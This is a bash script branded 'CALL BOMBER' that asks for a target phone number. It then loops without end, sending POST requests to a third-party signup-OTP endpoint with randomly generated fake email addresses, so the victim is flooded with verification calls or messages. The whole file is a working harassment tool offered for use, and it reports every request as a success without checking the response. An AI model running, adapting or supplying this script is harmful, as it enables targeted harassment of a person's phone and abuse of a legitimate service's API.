#!/bin/bash

# Banner Function
banner() {
    clear
    echo -e "\e[1;32m"
    echo " ██████╗ █████╗ ██╗     ██╗     "
    echo "██╔════╝██╔══██╗██║     ██║     "
    echo "██║     ███████║██║     ██║     "
    echo "██║     ██╔══██║██║     ██║     "
    echo "╚██████╗██║  ██║███████╗███████╗"
    echo " ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝"
    echo -e "\e[0;32m         CALL  BOMBER\e[0m"
    echo -e "\e[1;31m[+] Developed by: PROFESSOR-ABHEEBHAI\e[0m"
    echo -e "\e[1;34m[+] Join my WhatsApp Channel:\e[0m \e[4;36mhttps://whatsapp.com/channel/0029Vb6duo97YSd4TU5OUo3K\e[0m"
    echo -e "\e[1;90m--------------------------------------------------\e[0m"
}

# Random Email Generator
generate_email() {
    echo "$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)@gmail.com"
}

# Cleanup on exit
trap 'echo -e "\n\e[1;31m[!] Stopped by User.\e[0m"; exit' INT

# Execution
banner
read -p $'\e[1;32m[?] Target Phone Number: \e[0m' target

# Target Validation
if [[ -z "$target" ]]; then
    echo -e "\e[1;31m[!] Error: Number enter karein!\e[0m"
    exit 1
fi

echo -e "\e[1;33m[*] Starting bombing on: $target\e[0m"
sleep 1

# API Loop
while true; do
    email=$(generate_email)
    
    # API Request
    response=$(curl -s -X POST "https://martbackend.herokuapp.com/user/signUpOtp" \
        -H "Content-Type: application/json" \
        -H "User-Agent: okhttp/4.9.2" \
        -d "{\"phone\":\"$target\",\"email\":\"$email\",\"name\":\"ali khan\",\"referralCode\":\"\"}")

    echo -e "\e[1;36m[+] Request Sent with:\e[0m $email"
    echo -e "\e[1;32m[✔] Status: Success\e[0m"
    echo -e "\e[1;90m----------------------------------------\e[0m"
    
    sleep 3
done
